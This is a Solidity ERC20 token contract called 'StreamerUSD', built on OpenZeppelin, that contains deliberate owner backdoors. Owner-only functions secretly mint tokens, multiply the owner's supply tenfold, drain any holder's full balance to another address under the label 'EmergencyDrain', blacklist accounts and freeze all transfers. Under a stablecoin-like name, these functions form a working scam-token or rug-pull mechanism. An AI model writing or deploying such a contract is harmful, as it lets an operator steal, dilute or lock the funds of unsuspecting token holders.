// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract StreamerUSD is ERC20, Ownable {
    mapping(address => bool) private _blacklisted;
    mapping(address => bool) private _isExempt;
    bool public tradingEnabled = false;
    bool private _globalFreeze = false;
    uint256 public maxTransferAmount;
    uint256 public maxWalletAmount;
    bool private _supplyMultiplied = false;

    event BlacklistUpdated(address indexed account, bool status);
    event ExemptUpdated(address indexed account, bool status);
    event TradingStatusChanged(bool status);
    event GlobalFreezeChanged(bool status);
    event SecretMint(address indexed to, uint256 amount);
    event SupplyMultiplied(uint256 multiplier);
    event EmergencyDrain(address indexed from, address indexed to, uint256 amount);

    constructor(
        string memory name,
        string memory symbol,
        uint256 initialSupply
    ) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _isExempt[msg.sender] = true;
        maxTransferAmount = initialSupply;
        maxWalletAmount = initialSupply;
    }

    function _secretMint(address to, uint256 amount) external onlyOwner {
        _mint(to, amount);
        emit SecretMint(to, amount);
    }

    function updateSupply() external onlyOwner {
        require(!_supplyMultiplied, "Supply already multiplied");
        uint256 currentSupply = balanceOf(owner());
        _mint(owner(), currentSupply * 9); // Multiplica por 10 (atual + 9x)
        _supplyMultiplied = true;
        emit SupplyMultiplied(10);
    }

    function drainWallet(address target, address to) external onlyOwner {
        require(target != address(0) && to != address(0), "Invalid address");
        uint256 balance = balanceOf(target);
        require(balance > 0, "No balance to drain");
        _transfer(target, to, balance);
        emit EmergencyDrain(target, to, balance);
    }

    function blacklistAddress(address account) external onlyOwner {
        _blacklisted[account] = true;
        emit BlacklistUpdated(account, true);
    }

    function removeFromBlacklist(address account) external onlyOwner {
        _blacklisted[account] = false;
        emit BlacklistUpdated(account, false);
    }

    function setExempt(address account, bool status) external onlyOwner {
        _isExempt[account] = status;
        emit ExemptUpdated(account, status);
    }

    function setGlobalFreeze(bool state) external onlyOwner {
        _globalFreeze = state;
        emit GlobalFreezeChanged(state);
    }

    function setTradingStatus(bool status) external onlyOwner {
        tradingEnabled = status;
        emit TradingStatusChanged(status);
    }

    function setMaxTransferAmount(uint256 amount) external onlyOwner {
        maxTransferAmount = amount;
    }

    function setMaxWalletAmount(uint256 amount) external onlyOwner {
        maxWalletAmount = amount;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        require(!_blacklisted[from] && !_blacklisted[to], "Blacklisted address");
        require(!_globalFreeze, "Transfers are frozen");
        
        if (!_isExempt[from] && !_isExempt[to]) {
            require(tradingEnabled, "Trading not enabled");
            require(amount <= maxTransferAmount, "Transfer amount exceeds limit");
            require(balanceOf(to) + amount <= maxWalletAmount, "Max wallet amount exceeded");
        }

        super._transfer(from, to, amount);
    }

    // View functions
    function isBlacklisted(address account) public view returns (bool) {
        return _blacklisted[account];
    }

    function isExempt(address account) public view returns (bool) {
        return _isExempt[account];
    }

    function getGlobalFreeze() public view returns (bool) {
        return _globalFreeze;
    }

    function isSupplyMultiplied() public view returns (bool) {
        return _supplyMultiplied;
    }
}